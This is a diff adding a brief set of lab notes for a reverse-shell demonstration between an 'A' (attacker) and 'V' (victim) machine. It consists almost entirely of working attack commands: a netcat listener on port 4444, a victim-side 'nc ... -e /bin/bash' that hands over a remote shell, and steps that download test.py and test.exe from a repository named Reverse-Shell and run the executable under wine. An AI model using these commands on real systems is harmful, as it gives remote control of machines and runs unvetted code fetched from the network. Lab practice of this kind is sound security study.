@@ -1,0 +1,11 @@
+A/V apt update
+A/V apt install netcat-traditional
+ A  nc -lvnp 4444
+ V  nc 172.17.0.2 4444 -e /bin/bash
+
+ V  apt install wget
+ V  wget https://raw.githubusercontent.com/LucasDANQUIGNY/Reverse-Shell/main/test.py
+ V  wget https://raw.githubusercontent.com/LucasDANQUIGNY/Reverse-Shell/main/test.exe
+
+ V  apt install wine
+ V  wine test.exe
